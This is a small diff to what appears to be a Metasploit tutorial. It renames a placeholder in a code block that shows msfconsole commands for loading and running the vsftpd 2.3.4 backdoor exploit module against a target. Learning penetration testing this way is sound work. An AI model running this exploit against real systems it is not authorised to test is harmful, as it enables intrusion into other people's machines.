@@ -125,7 +125,7 @@ A typical module run (set the target, payload and listener, then fire):
 ```text
 msf6 > search type:exploit name:vsftpd
 msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
-msf6 > set RHOSTS TARGET
+msf6 > set RHOSTS HOST
 msf6 > check
 msf6 > run
 ```
